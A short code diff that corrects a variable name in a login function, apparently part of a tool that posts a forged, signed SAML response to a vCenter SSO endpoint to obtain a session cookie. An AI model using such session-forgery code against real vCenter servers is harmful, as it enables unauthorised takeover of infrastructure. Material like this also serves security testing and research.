@@ -289,7 +289,7 @@ def login(vcenter, saml_resp):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
         print('[*] Attempting to log into vCenter with the signed SAML request')
-        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
+        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
         r = requests.post(
             f"https://{vcenter}/ui/saml/websso/sso",
             allow_redirects=False,
